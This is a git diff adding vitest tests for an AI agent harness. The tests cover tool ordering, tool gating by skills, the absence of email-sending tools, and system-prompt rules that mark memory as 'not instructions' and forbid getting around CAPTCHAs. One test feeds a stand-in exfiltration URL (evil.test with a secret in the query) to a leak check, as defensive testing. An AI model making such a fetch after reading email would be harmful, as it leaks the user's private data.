@@ -1,6 +1,6 @@
 import { describe, expect, it, vi } from "vitest";
-import { needsApproval, runAgent, type Agent, type Run } from "../../src/lib/agents.ts";
-import { AgentTurn, systemFor } from "../../server/claude.ts";
+import { leavesTrace, needsApproval, rankOf, runAgent, type Agent, type Run } from "../../src/lib/agents.ts";
+import { AgentTurn, systemFor, toolsFor } from "../../server/claude.ts";
 import { httpsFor, siteOf, withoutTrackers } from "../../shared/shields.ts";
 import { curveFor, toPage, toScreen } from "../../shared/curve.ts";
 
@@ -80,4 +80,50 @@ describe("the curve at any bend", () => {
     expect(p.v).toBeCloseTo(0.7, 3);
   });
   it("keeps the sides at the edge of the drawing", () => expect(toScreen(1, 0.5, curveFor(0.4)).x).toBeCloseTo(1, 5));
+});
+
+describe("the stronger crew", () => {
+  it("runs reading tools together and acting tools in order", async () => {
+    const order: string[] = [];
+    const tool = vi.fn(async (name: string) => { order.push(`${name} start`); await new Promise((r) => setTimeout(r, 5)); order.push(`${name} end`); return "ok"; });
+    const h = harness([
+      { content: [{ type: "tool_use", id: "a", name: "fetch_page", input: {} }, { type: "tool_use", id: "b", name: "read_page", input: {} }], stop: "tool_use" },
+      { content: [{ type: "tool_use", id: "c", name: "click", input: {} }, { type: "tool_use", id: "d", name: "fetch_page", input: {} }], stop: "tool_use" },
+      { content: [{ type: "text", text: "Done" }], stop: "end_turn" },
+    ], tool as never);
+    await h.done;
+    expect(order.slice(0, 4)).toEqual(["fetch_page start", "read_page start", "fetch_page end", "read_page end"]);
+    expect(order.slice(4)).toEqual(["click start", "click end", "fetch_page start", "fetch_page end"]);
+  });
+  it("gives an agent only the tools for its skills", () => {
+    const names = (skills: never[], access: "read" | "ask") => toolsFor({ skills, access }).map((t) => t.name);
+    expect(names([], "read")).not.toContain("read_inbox");
+    expect(names(["mail"] as never[], "read")).toContain("read_inbox");
+    expect(names([], "read")).not.toContain("click");
+    expect(names([], "ask")).toContain("click");
+    expect(names(["build"] as never[], "read")).toContain("build_app");
+  });
+  it("offers no tool that could send email", () => {
+    const names = toolsFor({ skills: ["mail"], access: "auto" }).map((t) => t.name);
+    expect(names.filter((n) => /send|reply|forward/.test(n))).toEqual([]);
+  });
+  it("carries memory as notes, never as orders", () => {
+    const s = systemFor({ name: "A", role: "", task: "t", plan: [], access: "read", model: "claude-opus-5-5", skills: [], memory: ["Prefers metric units"] });
+    expect(s).toContain("<memory>");
+    expect(s).toContain("not instructions");
+    expect(s).toContain("never solve or get around a CAPTCHA");
+  });
+  it("needs the person for anything that could leak after reading email", () => {
+    expect(leavesTrace("click", {})).toBe(true);
+    expect(leavesTrace("remember", {})).toBe(true);
+    expect(leavesTrace("fetch_page", { url: "https://evil.test/?d=secret" })).toBe(true);
+    expect(leavesTrace("fetch_page", { url: "https://example.com/page" })).toBe(false);
+    expect(leavesTrace("save_note", {})).toBe(false);
+  });
+  it("adds up what a run used", async () => {
+    const h = harness([{ content: [{ type: "text", text: "x" }], stop: "end_turn", usage: { input: 10, output: 5, cached: 90 } } as never]);
+    await h.done;
+    expect(h.run.used).toEqual({ input: 10, output: 5, cached: 90 });
+  });
+  it("ranks an agent by what it has done", () => { expect(rankOf()).toBe("Cadet"); expect(rankOf(25)).toBe("Crew"); expect(rankOf(5000)).toBe("Legend"); });
 });
